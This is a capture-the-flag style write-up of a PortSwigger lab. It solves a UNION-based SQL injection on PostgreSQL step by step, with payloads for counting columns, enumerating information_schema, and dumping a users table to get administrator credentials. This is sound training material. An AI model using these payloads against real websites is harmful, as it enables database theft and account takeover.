---
layout: post
title: "SQL injection attack, listing the database contents on non-Oracle databases [Write-up]"
date: 2026-06-29
platform: portswigger
vulntype: sqli
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** SQL injection attack, listing the database contents on non-Oracle databases

**Platform:** PortSwigger

**Difficulty:** Medium  

---

# Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

# Solution

First, we intercept the request using Burp Suite and try to trigger an SQL error by using `'`

<p align="center">
  <img src="/assets/css/img/SQL/sql8.png" alt="SQLi" />
</p>

```python
Pets'
```

After we received a 500 error and the database returned an error, the next step is to determine the number of columns. 

<p align="center">
  <img src="/assets/css/img/SQL/sql9.png" alt="SQLi" />
</p>

```python
Pets'+ORDER+BY+1+--
Pets'+ORDER+BY+2+--
Pets'+ORDER+BY+3+--
```

Based on the error in the third attempt, we can see that the table has two columns. 

Now that we know the number of columns, we'll check whether the data types are text using the following query


```python
Pets'+UNION+SELECT+'Hack','Lives'--
```

Since the database displayed our query on the page, we can conclude that the page is vulnerable to SQL injection.

The next step we'll take is to explore the database

<p align="center">
  <img src="/assets/css/img/SQL/sql10.png" alt="SQLi" />
</p>

```python
Pets'+UNION+SELECT+version(),'Lives'--
```

> Since the screenshot isn't working, the rest of the article will not include any screenshots.

We find out that our database is PostgreSQL; next, we need to find out the names of the tables in `information_schema`.


```python
'UNION+SELECT+table_name,+'Hack'+FROM+information_schema.tables--
```

We are most interested in the table named users_eicjaa

Let's find out the names of the columns in this table 


```python
'+UNION+SELECT+column_name,'Hack'+FROM+information_schema.columns+WHERE+table_name+%3d+'users_eicjaa'--
```

And the last query will be a query to display the contents of the table 


```python
'+UNION+SELECT+username_gomqly,+password_mgacet+FROM+users_eicjaa--
```

After that, we can find the administrator's login credentials, go to the login form, enter the credentials, and boom—we've completed this lab. 
